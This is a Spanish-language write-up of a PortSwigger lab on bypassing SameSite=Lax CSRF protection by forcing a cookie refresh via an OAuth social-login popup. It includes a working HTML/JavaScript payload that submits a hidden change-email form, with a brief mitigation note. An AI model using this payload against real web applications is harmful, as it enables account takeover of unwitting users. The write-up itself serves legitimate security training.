En esta clase explotamos una vulnerabilidad de CSRF en combinación con la política SameSite=Lax. Aunque el navegador no envía cookies en peticiones POST cruzadas por defecto, si se logra refrescar la sesión del usuario a través de una redirección automática a /social-login, se emite una nueva cookie sin restricciones SameSite explícitas.

Sin embargo, esta redirección necesita interacción manual para evitar el bloqueo del popup. Por eso, el exploit incluye un mensaje para que el usuario haga clic, abriendo así la ventana y forzando el flujo OAuth. Una vez completado el proceso, tras una breve pausa, se lanza el ataque CSRF.

Este escenario demuestra cómo una mala implementación del control de sesiones unida a SameSite por defecto puede dejar aplicaciones vulnerables a ataques que dependen únicamente de ingeniería social y sincronización temporal.

Solucion
En este laboratorio vemos que tiene un refresh de cookies por lo cual se actualizan
un ejemplo seria que cuando nos logeamos y despues nos vamos a la pagina principal nos deslogeamos  y le damos my account en ese momento podemos ver que nos lleva a social-login
![Pasted_image_20250723225130.png](/Imagenes/Pasted_image_20250723225130.png)y despues de esperar unos cuantos segundos nos lleva a otra direccion
![Pasted_image_20250723225307.png](/Imagenes/Pasted_image_20250723225307.png)
Por lo cual podemos realizar un nuevo payload

(
<form method="POST" action="https://0a39008703f53aeaa37bee4e008d005b.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="pwned@portswigger.net">
</form>
<p>Click anywhere on the page</p>
<script>
    window.onclick = () => {
        window.open('https://0a39008703f53aeaa37bee4e008d005b.web-security-academy.net/social-login');
        setTimeout(changeEmail, 5000);
    }

    function changeEmail() {
        document.forms[0].submit();
    }
</script>
)

**Resumen del payload:**

Este _payload_ es un ataque **CSRF** que intenta cambiar el correo de una cuenta autenticada sin que el usuario lo note.

🔹 Al hacer clic en la página:

1. Se abre una nueva pestaña (posiblemente para distraer).
    
2. Después de 5 segundos, se envía automáticamente un formulario oculto que cambia el correo del usuario a `pwned@portswigger.net`.
    

🔹 Si el usuario está logueado, el servidor acepta el cambio creyendo que es legítimo.

🛡️ **Mitigación:** Usar tokens CSRF, verificar el origen de la petición y configurar cookies con `SameSite`.